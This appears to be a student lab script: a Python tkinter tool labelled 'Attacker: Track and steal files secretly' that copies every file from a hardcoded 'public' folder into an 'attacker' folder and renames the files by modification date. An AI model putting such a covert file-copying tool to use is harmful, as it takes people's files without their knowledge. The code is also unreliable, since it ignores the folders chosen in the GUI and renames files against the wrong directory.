import os,shutil,os.path,sys
import filecmp
import asyncio
import time, datetime
from tkinter import *
from tkinter.filedialog import asksaveasfile
from tkinter import messagebox,filedialog

app = Tk()
app.title("Attacker: Track and steal files secretly")
app.geometry("500x200")

#==========Function button browse to public folder=============
def browseBtnPublic():
    global track_path
    askDirectoryTrack= filedialog.askdirectory()   
    track_path.set(askDirectoryTrack) 
    os.chdir(askDirectoryTrack)
    src = os.getcwd()
    print("1",src)
    for f in os.listdir():
       listSrc = os.path.splitext(f)
       print (f)
       
lbl1 = Label(app,text="Track to public directory:")
lbl1.grid(column=0, row=0, sticky='W')

butBrsPb = Button(app, text='Browse',command=browseBtnPublic) 
butBrsPb.grid(column=0, row=1)
track_path = StringVar()
lbl2 = Label(app, textvariable=track_path)
lbl2.grid(column=1, row=1,sticky='W')

#===========Funtion: button browse to attacker's folder======
def browseBtnAttacker():
    global dest_path
    askDirectoryAttacker= filedialog.askdirectory()   
    dest_path.set(askDirectoryAttacker) 
    os.chdir(askDirectoryAttacker) 
    dst = os.getcwd()
    print("2",dst)
    for f in os.listdir():
        listSrc = os.path.splitext(f)
        print(f)
lbl3 = Label(app,text="Attacker's directory:")
lbl3.grid(column=0, row=2, sticky='W')

butBrsAt = Button(app, text='Browse',command=browseBtnAttacker) 
butBrsAt.grid(column=0, row=3)
dest_path = StringVar()
lbl4 = Label(app, textvariable=dest_path)
lbl4.grid(column=1, row=3,sticky='W')
#==========Start button-Function to start tracking===
src = "C:/Users/phanh/source/repos/Lab1/public/"
dst = "C:/Users/phanh/source/repos/Lab1/attacker/"

def Track():
    def Copy(src):
        L = []
        for root, dirs, files in os.walk(src):
            for file in files:
                L.append(os.path.join(root,file))
                shutil.copyfile(os.path.join(root,file),dst+file) 
                modified_time = os.path.getmtime(file)
                modified_date = datetime.date.fromtimestamp(modified_time)
                os.rename(file,modified_date.strftime("%d.%m.%Y"+"_"+file))
       
    Copy(src)

startBtn = Button(app,text='Start tracking!',command=Track)
startBtn.grid(column=1, row=6, sticky='W')
#==================================================
app.mainloop()
